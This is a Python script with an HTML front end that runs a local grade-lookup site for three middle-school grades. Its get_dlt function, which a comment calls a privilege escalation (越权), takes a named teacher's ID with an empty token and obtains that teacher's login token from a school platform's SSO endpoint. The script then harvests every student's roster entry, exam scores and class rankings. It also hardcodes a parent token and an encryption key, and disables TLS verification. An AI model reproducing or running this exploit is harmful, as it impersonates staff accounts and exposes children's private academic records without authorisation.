#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
查分 Web UI（融合 UAPI Teal 组件 + QQ 文档站布局）
用法:
    python score_web.py          # 启动后浏览器打开 http://127.0.0.1:8800
支持初一 / 初二 / 初三 三个年级，输入姓名即可查对应年级期中成绩 + 判卷进度。
依赖 .pylibs 下的 pycryptodome。
"""

import json, urllib.request, urllib.parse, ssl, sys, os, gzip, base64
import http.server, threading, time, datetime, concurrent.futures

BASE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(BASE, ".pylibs"))
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

KEY = b"RequestMappingHa"
PTOKEN = "userToken-allparenta0a97755c1779e2e3525bd5407859b5d"  # 家长 token 当 accessToken
NZY = "https://school.nicezhuanye.com"
DN  = "https://nicezhuanye.dongni100.com"
TCH_UID = "1445657423926137926"   # 李冬（有查分权限的老师）
SCHOOL = 5261712
PORT = 8800

# 三个年级的期中考试
EXAMS = [
    {"grade": "初一", "examId": 1079615161, "gradeId": 3213983},
    {"grade": "初二", "examId": 5872340, "gradeId": 2673906},
    {"grade": "初三", "examId": 945420786, "gradeId": 2673905},
]

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE


def enc(s):
    gz = gzip.compress(s.encode("utf-8"))
    return base64.b64encode(AES.new(KEY, AES.MODE_ECB).encrypt(pad(gz, 16))).decode()


def post(url, data, headers=None):
    h = {"User-Agent":"Mozilla/5.0","X-Requested-With":"XMLHttpRequest",
         "Content-Type":"application/json; charset=utf-8"}
    if headers: h.update(headers)
    r = urllib.request.Request(url, data=json.dumps(data).encode(), method="POST", headers=h)
    try:
        resp = urllib.request.urlopen(r, timeout=40, context=ctx)
        return resp.status, resp.read().decode("utf-8","replace"), resp.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace"), e.headers


def dn_get(dlt, path, params=None):
    qs = "?" + urllib.parse.urlencode(params) if params else ""
    h = {"User-Agent":"Mozilla/5.0","DONGNI-LOGIN":dlt,"Cookie":"dongniLoginToken="+dlt}
    r = urllib.request.Request(DN + path + qs, method="GET", headers=h)
    try:
        resp = urllib.request.urlopen(r, timeout=40, context=ctx)
        return resp.status, resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")


def get_dlt():
    """通过 getTicket 越权拿教师 dongniLoginToken"""
    st, txt, hd = post(NZY + "/nicezhuanye/ssoLogin/getTicket",
                       {"UserID": TCH_UID, "token": "",
                        "parameter": {"UserID": TCH_UID, "roleType": "teacher"}},
                       headers={"hqjl-user": TCH_UID, "hqjl-token": ""})
    ticket = json.loads(txt)["result"]
    st, txt, hd = post(DN + "/api/base/data/system/auth/sso",
                       {"dictKey": "nicezhuanye", "nicezhuanye": "prod",
                        "ticket": ticket, "clientType": 1})
    return json.loads(txt)["data"]["dongniLoginToken"]


STUDENT_INDEX = {}   # name -> [{className, studentNum, studentId, grade, examId}]
PAPER_MAP = {}       # examId -> {courseName: fullMark}
CLASS_MAP = {}       # (grade, className, examId) -> [studentId]
CLASS_SCORE_CACHE = {}  # (grade, className, examId) -> [(studentId, total)]
DLT = None
DLT_TIME = 0


def load_papers():
    """缓存各考试满分"""
    global PAPER_MAP
    for ex in EXAMS:
        st, txt = dn_get(DLT, "/api/exam/plan/paper",
                         {"examId": ex["examId"], "schoolId": SCHOOL})
        try:
            papers = json.loads(txt).get("data", [])
            PAPER_MAP[ex["examId"]] = {p["courseName"]: p["fullMark"] for p in papers}
        except Exception:
            PAPER_MAP[ex["examId"]] = {}


def build_index():
    global STUDENT_INDEX, CLASS_MAP
    idx = {}
    cmap = {}
    for ex in EXAMS:
        examId = ex["examId"]
        st, txt = dn_get(DLT, "/api/exam/plan/class",
                         {"examId": examId, "schoolId": SCHOOL})
        try:
            classes = json.loads(txt).get("data", [])
        except Exception:
            classes = []
        for c in classes:
            st, txt = dn_get(DLT, "/api/exam/plan/student",
                             {"examId": examId, "schoolId": SCHOOL, "classId": c["classId"]})
            try:
                students = json.loads(txt).get("data", {}).get("student", [])
            except Exception:
                students = []
            sids = []
            for s in students:
                idx.setdefault(s["studentName"], []).append({
                    "className": c["className"], "studentNum": s.get("studentNum", ""),
                    "studentId": s["studentId"], "grade": ex["grade"], "examId": examId,
                })
                sids.append(s["studentId"])
            cmap[(ex["grade"], c["className"], examId)] = sids
    STUDENT_INDEX = idx
    CLASS_MAP = cmap


def class_total_rank(m):
    """计算某学生在班级里的总分排名（查同班学生总分排序，带缓存，并行加速）"""
    key = (m["grade"], m["className"], m["examId"])
    if key not in CLASS_SCORE_CACHE:
        sids = CLASS_MAP.get(key, [])
        def get_total(sid):
            cs = fetch_score(sid, m["examId"])
            return (sid, sum(c.get("totalScore", 0) or 0 for c in cs)) if cs else None
        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
            results = list(ex.map(get_total, sids))
        scores = [r for r in results if r]
        scores.sort(key=lambda x: -x[1])
        CLASS_SCORE_CACHE[key] = scores
    scores = CLASS_SCORE_CACHE[key]
    rank = next((i + 1 for i, (sid, t) in enumerate(scores) if sid == m["studentId"]), None)
    return rank, len(scores)


def fetch_score(student_id, exam_id):
    st, txt = dn_get(DLT, "/api/analysis/data/monitor/exam/student/course",
                     {"examId": exam_id, "studentId": student_id, "schoolId": SCHOOL})
    try:
        return json.loads(txt).get("data", {}).get("courses", [])
    except Exception:
        return None


def query(name):
    global DLT, DLT_TIME
    matches = STUDENT_INDEX.get(name)
    if not matches:
        return {"ok": False, "error": f"未找到学生「{name}」"}
    if time.time() - DLT_TIME > 5400:
        DLT = get_dlt(); DLT_TIME = time.time()
    out = []
    for m in matches:
        exam_id = m["examId"]
        courses = fetch_score(m["studentId"], exam_id)
        if courses is None:
            DLT = get_dlt(); DLT_TIME = time.time()
            courses = fetch_score(m["studentId"], exam_id)
        if courses is None:
            return {"ok": False, "error": "查分失败（token 失效）"}
        full_map = PAPER_MAP.get(exam_id, {})
        total_full = sum(full_map.values())
        for c in courses:
            c["totalScore"] = c.get("totalScore", 0) or 0
        total = sum(c["totalScore"] for c in courses)
        for c in courses:
            c["fullMark"] = full_map.get(c["courseName"])
            c["rate"] = round(c["totalScore"] / c["fullMark"] * 100, 1) if c["fullMark"] else None
        class_rank, class_count = class_total_rank(m)
        out.append({
            "className": m["className"], "studentNum": m["studentNum"],
            "studentId": m["studentId"], "grade": m["grade"],
            "total": total, "totalFull": total_full,
            "classTotalRank": class_rank, "classCount": class_count,
            "courses": courses,
        })
    return {"ok": True, "name": name, "students": out}


def get_progress():
    """三个年级的判卷进度"""
    global DLT, DLT_TIME
    if time.time() - DLT_TIME > 5400:
        DLT = get_dlt(); DLT_TIME = time.time()
    groups = []
    for ex in EXAMS:
        exam_id = ex["examId"]
        # 找该年级一个示例学生（用于拿班均）
        sid = None
        for matches in STUDENT_INDEX.values():
            for m in matches:
                if m["examId"] == exam_id:
                    sid = m["studentId"]; break
            if sid: break
        meta = {}
        st, txt = dn_get(DLT, "/api/exam/mark/progress/course/case",
                         {"examId": exam_id, "schoolId": SCHOOL})
        try:
            for c in json.loads(txt).get("data", []):
                meta[c["courseName"]] = {"answerStatus": c.get("answerStatus"),
                                         "entrust": c.get("paperEntrustStatus")}
        except Exception:
            pass
        avg = {}
        if sid:
            st, txt = dn_get(DLT, "/api/analysis/data/monitor/exam/student/course",
                             {"examId": exam_id, "studentId": sid, "schoolId": SCHOOL})
            try:
                for c in json.loads(txt).get("data", {}).get("courses", []):
                    avg[c["courseName"]] = float(c["averageScore"])
            except Exception:
                pass
        full_map = PAPER_MAP.get(exam_id, {})
        subjects = []
        for name, full in full_map.items():
            a = avg.get(name, 0.0)
            m = meta.get(name, {})
            subjects.append({"name": name, "full": full, "avg": round(a, 1),
                             "rate": round(a / full * 100),
                             "answerStatus": m.get("answerStatus"),
                             "entrust": m.get("entrust")})
        total_full = sum(full_map.values())
        total_avg = sum(s["avg"] for s in subjects)
        groups.append({"grade": ex["grade"], "examId": exam_id, "subjects": subjects,
                       "totalFull": total_full,
                       "overall": round(total_avg / total_full * 100) if total_full else 0})
    return {"ok": True, "groups": groups}


HTML = r"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>期中 · 查分</title>
<style>
  :root { --teal:#0d9488; --teal2:#14b8a6; --fg:#18181b; --muted:#71717a; --faint:#a1a1aa; --line:rgba(24,24,27,0.07); --code-bg:rgba(24,24,27,0.035); --bg:#fff; --topbar-bg:rgba(255,255,255,0.86); --input-border:#e4e4e7; --card-bg:linear-gradient(180deg,#fff,#fafafa); --track-bg:rgba(24,24,27,0.05); --mark:#18181b; }
  body.dark { --fg:#fafafa; --muted:#a1a1aa; --faint:#71717a; --line:rgba(255,255,255,0.08); --code-bg:rgba(255,255,255,0.06); --bg:#09090b; --topbar-bg:rgba(9,9,11,0.86); --input-border:#27272a; --card-bg:linear-gradient(180deg,#111113,#0d0d0f); --track-bg:rgba(255,255,255,0.06); --mark:#fafafa; }
  * { box-sizing:border-box; }
  html { scroll-behavior:smooth; scroll-padding-top:88px; }
  body { margin:0; color:var(--fg); background:var(--bg); font-family:Inter,"Noto Sans SC",system-ui,sans-serif; font-size:14.5px; line-height:1.8; -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility; transition:background .2s, color .2s; }
  a { color:inherit; text-decoration:none; }
  .topbar { position:fixed; top:0; left:0; right:0; z-index:50; height:60px; display:flex; align-items:center; gap:12px; padding:0 40px; background:var(--topbar-bg); backdrop-filter:blur(14px) saturate(1.4); -webkit-backdrop-filter:blur(14px) saturate(1.4); }
  .topbar .logo { width:22px; height:22px; flex:none; }
  .topbar .brand { display:inline-flex; align-items:center; gap:9px; font-weight:600; font-size:14px; letter-spacing:-0.01em; }
  .topbar .brand .sep { color:rgba(24,24,27,0.18); font-weight:300; font-size:15px; transform:rotate(8deg); user-select:none; }
  .topbar .brand .doc { color:var(--muted); font-weight:400; }
  .topbar .right { margin-left:auto; font-size:12.5px; color:var(--faint); font-variant-numeric:tabular-nums; }
  .theme-btn { display:flex; align-items:center; justify-content:center; width:30px; height:30px; border:1px solid var(--line); border-radius:8px; background:transparent; color:var(--muted); cursor:pointer; }
  .theme-btn:hover { color:var(--fg); }
  .shell { max-width:1400px; margin:0 auto; padding-top:60px; }
  .main { display:flex; justify-content:center; }
  .content { width:100%; max-width:720px; padding:48px 48px 120px; }
  .content h1 { font-size:32px; line-height:1.25; letter-spacing:-0.03em; font-weight:600; margin:0 0 6px; }
  .content .sub { font-size:14px; color:var(--muted); margin:0 0 18px; }
  .stats { display:flex; flex-wrap:wrap; gap:8px; margin-bottom:24px; }
  .stat { display:inline-flex; align-items:baseline; gap:5px; font-size:12px; color:var(--muted); background:var(--code-bg); border-radius:999px; padding:4px 12px; }
  .stat b { font-weight:600; color:var(--fg); font-variant-numeric:tabular-nums; }
  .query { display:flex; gap:8px; margin-bottom:8px; }
  .query input { flex:1; min-width:0; height:44px; padding:0 14px; border:1px solid var(--input-border); border-radius:12px; background:var(--bg); color:var(--fg); font-size:14px; outline:none; transition:border-color .15s, box-shadow .15s; }
  .query input:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(13,148,136,0.12); }
  .query button { height:44px; padding:0 24px; border:none; background:var(--teal); color:#fff; font-size:14px; font-weight:500; border-radius:12px; cursor:pointer; transition:background .15s, transform .1s; }
  .query button:hover { background:#0b7f78; }
  .query button:active { transform:scale(.98); }
  .query button:disabled { opacity:.6; cursor:not-allowed; }
  .msg { font-size:12px; color:var(--muted); margin-top:8px; min-height:16px; }
  .msg.err { color:#ef4444; }
  .res { display:none; }
  .stu-card { display:flex; justify-content:space-between; align-items:center; gap:16px; margin-top:20px; padding:18px 20px; border:1px solid var(--line); border-radius:14px; background:var(--card-bg); }
  .stu-name { font-size:20px; font-weight:600; letter-spacing:-0.01em; line-height:1.3; }
  .stu-name .g-tag { display:inline-block; vertical-align:2px; margin-left:8px; font-size:11px; font-weight:500; padding:1px 8px; border-radius:999px; background:rgba(13,148,136,0.12); color:#0d9488; }
  .stu-meta { font-size:12.5px; color:var(--muted); margin-top:2px; }
  .stu-meta code { font-family:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace; font-size:0.85em; background:var(--code-bg); border-radius:5px; padding:2px 5px; }
  .stu-score { text-align:right; flex:none; }
  .stu-total { font-size:28px; font-weight:700; letter-spacing:-0.02em; color:var(--teal); line-height:1.1; font-variant-numeric:tabular-nums; }
  .stu-total em { font-style:normal; font-size:14px; font-weight:500; color:var(--faint); }
  .stu-rate { font-size:12px; color:var(--muted); margin-top:2px; font-variant-numeric:tabular-nums; }
  table { width:100%; border-collapse:collapse; margin:12px 0 16px; font-size:13.5px; }
  th { text-align:left; font-weight:500; color:var(--muted); border-bottom:1px solid var(--line); padding:8px 12px 8px 0; }
  td { border-bottom:1px solid var(--line); padding:8px 12px 8px 0; vertical-align:middle; }
  th.num, td.num { text-align:right; font-variant-numeric:tabular-nums; }
  tr:hover td { background:rgba(128,128,128,0.04); }
  .total td { font-weight:600; border-top:1.5px solid var(--fg); }
  .badge { display:inline-block; padding:2px 8px; font-size:12px; font-weight:500; border-radius:6px; white-space:nowrap; line-height:1.4; }
  .b-done { background:rgba(13,148,136,0.12); color:#0d9488; }
  .b-half { background:rgba(13,148,136,0.05); color:#0d9488; border:1px solid var(--line); }
  .b-pend { background:transparent; color:var(--muted); border:1px solid var(--line); }
  .charts { display:flex; gap:24px; align-items:flex-start; margin:4px 0 16px; flex-wrap:wrap; }
  .charts .chart { flex:1; min-width:280px; }
  .chart-row { display:flex; align-items:center; gap:10px; margin-bottom:8px; font-size:12.5px; }
  .chart-row .c-name { width:72px; flex:none; color:var(--fg); }
  .chart-row .c-track { flex:1; position:relative; height:18px; background:var(--track-bg); border-radius:5px; overflow:hidden; }
  .chart-row .c-stu { position:absolute; left:0; top:0; bottom:0; background:linear-gradient(90deg,var(--teal),var(--teal2)); border-radius:5px; min-width:2px; transition:width .6s cubic-bezier(.16,1,.3,1); }
  .chart-row .c-avg { position:absolute; top:-3px; bottom:-3px; width:2px; background:var(--mark); border-radius:1px; }
  .chart-row .c-val { width:70px; flex:none; text-align:right; color:var(--muted); font-variant-numeric:tabular-nums; white-space:nowrap; }
  .legend { display:flex; gap:16px; font-size:12px; color:var(--muted); margin-top:10px; }
  .legend span { display:inline-flex; align-items:center; }
  .legend i { display:inline-block; width:10px; height:10px; border-radius:2px; margin-right:5px; }
  .legend .lg-stu { background:linear-gradient(90deg,var(--teal),var(--teal2)); }
  .legend .lg-avg { background:var(--fg); }
  .radar { width:225px; height:auto; display:block; }
  .radar-cap { font-size:11px; color:var(--faint); text-align:center; margin-top:2px; }
  .panel { margin-top:52px; padding-top:28px; border-top:1px solid var(--line); }
  .panel h2 { font-size:20px; letter-spacing:-0.02em; font-weight:600; margin:0 0 4px; }
  .panel .hint { font-size:13px; color:var(--muted); margin:6px 0 8px; }
  .grade-block { margin-bottom:28px; }
  .grade-head { display:flex; align-items:baseline; justify-content:space-between; margin-bottom:10px; }
  .grade-head h3 { font-size:16px; letter-spacing:-0.01em; font-weight:600; margin:0; }
  .grade-head .g-overall { font-size:20px; font-weight:700; color:var(--teal); font-variant-numeric:tabular-nums; }
  .grade-head .g-overall em { font-style:normal; font-size:12px; font-weight:400; color:var(--faint); }
  .prog { margin-bottom:11px; }
  .prog-head { display:flex; justify-content:space-between; align-items:baseline; font-size:13px; margin-bottom:5px; }
  .prog-head .p-name { font-weight:500; }
  .prog-head .p-name em { font-style:normal; color:var(--faint); font-weight:400; }
  .prog-head .p-right { display:inline-flex; align-items:center; gap:8px; }
  .prog-head .p-val { color:var(--muted); font-variant-numeric:tabular-nums; }
  .prog-head .p-val b { color:var(--fg); font-weight:600; }
  .prog-track { height:8px; background:var(--track-bg); border-radius:999px; overflow:hidden; }
  .prog-fill { height:100%; border-radius:999px; background:linear-gradient(90deg,var(--teal),var(--teal2)); transition:width .7s cubic-bezier(.16,1,.3,1); }
  .prog-fill.low { background:linear-gradient(90deg,#d4d4d8,#a1a1aa); }
  .prog-fill.mid { background:linear-gradient(90deg,#2dd4bf,#14b8a6); }
  .p-tag { font-size:11px; padding:1px 7px; border-radius:999px; white-space:nowrap; }
  .p-tag.done { background:rgba(13,148,136,0.12); color:#0d9488; }
  .p-tag.doing { background:rgba(49,124,254,0.1); color:#317CFE; }
  .p-tag.stuck { background:rgba(24,24,27,0.06); color:var(--muted); }
  .p-tag.slow { background:rgba(234,179,8,0.12); color:#b45309; }
  .spin { display:inline-block; width:14px; height:14px; border:2px solid rgba(255,255,255,.4); border-top-color:#fff; border-radius:50%; animation:s .85s linear infinite; vertical-align:-2px; }
  @keyframes s { to { transform:rotate(360deg); } }
  @media(max-width:860px){ .topbar{padding:0 20px} .topbar .right{display:none} .content{padding:36px 20px 96px} .query{flex-direction:column} .stu-card{flex-direction:column; align-items:flex-start} .stu-score{text-align:left} }
</style>
</head>
<body>
<header class="topbar">
  <svg class="logo" viewBox="0 0 24 24" fill="none" stroke="#0d9488" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>
  <a class="brand" href="#">查分<span class="sep">/</span><span class="doc">期中（初一·初二·初三）</span></a>
  <span class="right" id="updated"></span>
  <button class="theme-btn" onclick="toggleTheme()" title="切换深浅色" aria-label="切换深浅色">
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9z"/></svg>
  </button>
</header>
<div class="shell">
  <div class="main">
    <article class="content">
      <h1>期中 · 查分</h1>
      <div class="sub">输入学生姓名查询初一 / 初二 / 初三期中成绩、排名与判卷进度。</div>
      <div class="stats">
        <span class="stat"><b>初一·初二·初三</b> 三个年级</span>
        <span class="stat"><b id="stucnt">—</b> 名学生</span>
        <span class="stat"><b id="clscnt">—</b> 个班</span>
      </div>
      <div class="query">
        <input id="q" type="text" placeholder="输入学生姓名，如：杨栋程 / 陈若琳" autocomplete="off">
        <button id="btn" onclick="go()">查询</button>
      </div>
      <div class="msg" id="msg"></div>
      <div class="res" id="res"></div>
      <section class="panel">
        <h2>判卷进度</h2>
        <p class="hint">各科班级平均分相对满分（应有满分）的完成度，反映阅卷进度。</p>
        <div id="progress"></div>
      </section>
    </article>
  </div>
</div>
<script>
async function go(){
  const name = document.getElementById('q').value.trim();
  const btn = document.getElementById('btn'), msg = document.getElementById('msg');
  const res = document.getElementById('res');
  if(!name){ msg.textContent='请输入姓名'; msg.className='msg err'; return; }
  btn.disabled = true; btn.innerHTML = '<span class="spin"></span> 查询中';
  msg.textContent='正在查询…'; msg.className='msg'; res.style.display='none';
  try{
    const r = await fetch('/api/query?name='+encodeURIComponent(name));
    const d = await r.json();
    if(!d.ok){ msg.textContent=d.error; msg.className='msg err'; }
    else{ msg.textContent=''; msg.className='msg'; render(d); }
  }catch(e){ msg.textContent='请求失败：'+e; msg.className='msg err'; }
  btn.disabled = false; btn.textContent='查询';
}
function ptag(s){
  const r = s.rate||0;
  if(r>=75) return '<span class="p-tag done">已判完</span>';
  if(r>=45) return '<span class="p-tag doing">阅卷中</span>';
  if(s.entrust===1) return '<span class="p-tag stuck">待分配</span>';
  if(s.answerStatus===0) return '<span class="p-tag slow">识别中</span>';
  return '<span class="p-tag stuck">缓慢</span>';
}
function badge(avg, full){
  const rate = avg/full;
  if(rate>=0.75) return '<span class="badge b-done">基本判完</span>';
  if(rate>=0.45) return '<span class="badge b-half">判了一半</span>';
  return '<span class="badge b-pend">阅卷中</span>';
}
function chartHtml(courses){
  let html = '<div class="chart">';
  for(const c of courses){
    const rate = Math.min(c.rate||0, 100);
    const avgRate = c.fullMark ? Math.min(parseFloat(c.averageScore)/c.fullMark*100, 100) : 0;
    html += `<div class="chart-row">`
      + `<span class="c-name">${c.courseName}</span>`
      + `<div class="c-track"><div class="c-stu" style="width:${rate}%"></div>`
      + `<div class="c-avg" style="left:${avgRate}%"></div></div>`
      + `<span class="c-val">${c.totalScore}/${c.fullMark}</span></div>`;
  }
  html += '<div class="legend"><span><i class="lg-stu"></i>学生得分率</span><span><i class="lg-avg"></i>班均得分率</span></div></div>';
  return html;
}
function radarHtml(courses){
  const cx=130, cy=112, R=78, n=courses.length;
  const ang = i => (i*360/n - 90) * Math.PI/180;
  const pt = (r,i) => [cx + r*Math.cos(ang(i)), cy + r*Math.sin(ang(i))];
  const poly = ratio => courses.map((_,i)=>pt(R*ratio,i).map(v=>v.toFixed(1)).join(',')).join(' ');
  let s = '<div><svg class="radar" viewBox="0 0 260 224">';
  for(const lvl of [0.25,0.5,0.75,1]){
    s += `<polygon points="${poly(lvl)}" fill="none" stroke="rgba(128,128,128,0.15)" stroke-width="1"/>`;
  }
  courses.forEach((_,i)=>{ const [x,y]=pt(R,i); s += `<line x1="${cx}" y1="${cy}" x2="${x.toFixed(1)}" y2="${y.toFixed(1)}" stroke="rgba(128,128,128,0.15)"/>`; });
  const avgPts = courses.map((c,i)=>{ const ar = c.fullMark ? Math.min(parseFloat(c.averageScore)/c.fullMark,1) : 0; return pt(R*ar,i).map(v=>v.toFixed(1)).join(','); }).join(' ');
  const stuPts = courses.map((c,i)=>pt(R*Math.min((c.rate||0)/100,1),i).map(v=>v.toFixed(1)).join(',')).join(' ');
  s += `<polygon points="${avgPts}" fill="none" stroke="var(--mark)" stroke-width="1.5" stroke-dasharray="3,2" opacity="0.55"/>`;
  s += `<polygon points="${stuPts}" fill="rgba(13,148,136,0.22)" stroke="#0d9488" stroke-width="2"/>`;
  courses.forEach((c,i)=>{ const [x,y]=pt(R+20,i); s += `<text x="${x.toFixed(1)}" y="${y.toFixed(1)}" text-anchor="middle" dominant-baseline="middle" font-size="10.5" fill="var(--muted)">${c.courseName}</text>`; });
  s += '</svg><div class="radar-cap">各科得分率（绿=学生 · 虚线=班均）</div></div>';
  return s;
}
function render(d){
  const res = document.getElementById('res');
  let html = '';
  for(const s of d.students){
    const rate = (s.total/s.totalFull*100).toFixed(1);
    const cRank = s.classTotalRank ? `班级总分第 <b>${s.classTotalRank}</b>/${s.classCount}` : '班级排名 —';
    html += `<div class="stu-card">`
      + `<div><div class="stu-name">${d.name}<span class="g-tag">${s.grade}</span></div>`
      + `<div class="stu-meta">${s.className} · 学号 <code>${s.studentNum}</code> · ${cRank}</div></div>`
      + `<div class="stu-score"><div class="stu-total">${s.total}<em>/${s.totalFull}</em></div>`
      + `<div class="stu-rate">得分率 ${rate}% · 班级第 ${s.classTotalRank ?? '—'}/${s.classCount}</div></div></div>`;
    html += '<table><thead><tr><th>科目</th><th class="num">分数</th><th class="num">满分</th><th class="num">年级</th><th class="num">班级</th><th class="num">班均</th><th>状态</th></tr></thead><tbody>';
    for(const c of s.courses){
      html += `<tr><td>${c.courseName}</td><td class="num">${c.totalScore}</td>`
        +`<td class="num">${c.fullMark!=null?c.fullMark:'—'}</td>`
        +`<td class="num">${c.examRanking}</td><td class="num">${c.classRanking}</td>`
        +`<td class="num">${c.averageScore}</td>`
        +`<td>${badge(parseFloat(c.averageScore), c.fullMark!=null?c.fullMark:100)}</td></tr>`;
    }
    html += `<tr class="total"><td>合计</td><td class="num">${s.total}</td><td class="num">${s.totalFull}</td><td colspan="4"></td></tr>`;
    html += '</tbody></table>';
    html += '<div class="charts">' + chartHtml(s.courses) + radarHtml(s.courses) + '</div>';
    html += '<br>';
  }
  res.innerHTML = html;
  res.style.display='block';
}
async function loadProgress(){
  try{
    const r = await fetch('/api/progress');
    const d = await r.json();
    if(!d.ok) return;
    document.getElementById('updated').textContent = '更新 ' + new Date().toLocaleTimeString('zh-CN',{hour:'2-digit',minute:'2-digit'});
    let html = '';
    for(const g of d.groups){
      html += `<div class="grade-block"><div class="grade-head"><h3>${g.grade}</h3>`
        + `<span class="g-overall">${g.overall}% <em>整体完成度</em></span></div>`;
      for(const s of g.subjects){
        const cls = s.rate>=75 ? '' : (s.rate>=45 ? ' mid' : ' low');
        html += `<div class="prog">`
          + `<div class="prog-head"><span class="p-name">${s.name} <em>满分 ${s.full}</em></span>`
          + `<span class="p-right"><span class="p-val"><b>${s.avg}</b> / ${s.full} · ${s.rate}%</span>${ptag(s)}</span></div>`
          + `<div class="prog-track"><div class="prog-fill${cls}" style="width:${s.rate}%"></div></div></div>`;
      }
      html += '</div>';
    }
    document.getElementById('progress').innerHTML = html;
  }catch(e){}
}
function toggleTheme(){
  const dark = document.body.classList.toggle('dark');
  try{ localStorage.setItem('theme', dark ? 'dark' : 'light'); }catch(e){}
}
try{ if(localStorage.getItem('theme')==='dark') document.body.classList.add('dark'); }catch(e){}
loadProgress();
document.getElementById('q').addEventListener('keydown', e=>{ if(e.key==='Enter') go(); });
</script>
</body>
</html>"""


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path in ("/", "/index.html"):
            body = HTML.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif parsed.path == "/api/query":
            qs = urllib.parse.parse_qs(parsed.query)
            name = qs.get("name", [""])[0].strip()
            result = query(name)
            body = json.dumps(result, ensure_ascii=False).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif parsed.path == "/api/progress":
            result = get_progress()
            body = json.dumps(result, ensure_ascii=False).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()

    def log_message(self, *a):
        pass


def main():
    global DLT, DLT_TIME
    print("[*] 拿教师 token ...")
    DLT = get_dlt(); DLT_TIME = time.time()
    print("[*] 加载各年级满分 ...")
    load_papers()
    print("[*] 预加载 初一/初二/初三 学生名单（约 130 个请求，需 1-3 分钟）...")
    build_index()
    print(f"[*] 共加载 {len(STUDENT_INDEX)} 名学生")
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", PORT), Handler)
    print(f"\n[OK] 查分服务已启动: http://127.0.0.1:{PORT}")
    print("    浏览器打开上面的地址，输入姓名即可查分。Ctrl+C 退出。\n")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 已退出")


if __name__ == "__main__":
    main()
